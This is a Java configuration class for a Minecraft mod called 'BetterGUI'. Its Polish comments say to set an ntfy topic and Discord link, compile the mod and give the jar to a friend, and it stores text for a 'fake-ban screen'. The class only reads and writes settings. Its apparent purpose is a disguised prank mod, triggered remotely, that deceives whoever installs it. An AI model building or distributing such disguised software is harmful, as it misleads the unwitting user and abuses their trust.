package com.bettergui.ntfy;

import com.bettergui.BetterGuiMod;
import net.fabricmc.loader.api.FabricLoader;

import java.io.*;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Properties;

/**
 * Config loaded from .minecraft/config/bettergui-ntfy.properties
 *
 * ╔══════════════════════════════════════════════════╗
 * ║  PRZED WRZUCENIEM MODA KOLEDZE:                  ║
 * ║  1. Ustaw topic na swój unikalny string          ║
 * ║  2. Ustaw discord_link na prawdziwy serwer       ║
 * ║  3. Skompiluj i daj mu jara                      ║
 * ╚══════════════════════════════════════════════════╝
 */
public class NtfyConfig {

    private static final Path CONFIG_PATH = FabricLoader.getInstance()
            .getConfigDir().resolve("bettergui-ntfy.properties");

    // ── Defaults (zmień przed kompilacją) ───────────────────────────────────
    /** Twój unikalny topic. Zmień na coś losowego, np. "mc-trol-k4j3x9" */
    public String topic        = "mc-bettergui-changeme";
    public String server       = "https://ntfy.sh";
    /** Link Discord pokazany na fake-ban screenie */
    public String discordLink  = "dc.anarchia.gg";
    /** Nazwa serwera pokazana na fake-ban screenie */
    public String serverName   = "Anarchia.gg";

    // ── Load / Save ─────────────────────────────────────────────────────────

    public static NtfyConfig load() {
        NtfyConfig cfg = new NtfyConfig();
        if (Files.exists(CONFIG_PATH)) {
            Properties p = new Properties();
            try (InputStream in = Files.newInputStream(CONFIG_PATH)) {
                p.load(in);
                cfg.topic       = p.getProperty("topic",       cfg.topic);
                cfg.server      = p.getProperty("server",      cfg.server);
                cfg.discordLink = p.getProperty("discord_link",cfg.discordLink);
                cfg.serverName  = p.getProperty("server_name", cfg.serverName);
            } catch (IOException e) {
                BetterGuiMod.LOGGER.warn("[BetterGUI] Failed to read ntfy config: {}", e.getMessage());
            }
        } else {
            cfg.save(); // write defaults on first run
        }
        return cfg;
    }

    public void save() {
        Properties p = new Properties();
        p.setProperty("topic",       topic);
        p.setProperty("server",      server);
        p.setProperty("discord_link",discordLink);
        p.setProperty("server_name", serverName);
        try {
            Files.createDirectories(CONFIG_PATH.getParent());
            try (OutputStream out = Files.newOutputStream(CONFIG_PATH)) {
                p.store(out,
                    "BetterGUI ntfy config\n" +
                    "topic        = unikalny topic (ten sam u ciebie i u kolegi)\n" +
                    "server       = ntfy server URL\n" +
                    "discord_link = link pokazany na fake-ban screenie\n" +
                    "server_name  = nazwa serwera na fake-ban screenie");
            }
        } catch (IOException e) {
            BetterGuiMod.LOGGER.warn("[BetterGUI] Failed to save ntfy config: {}", e.getMessage());
        }
    }
}
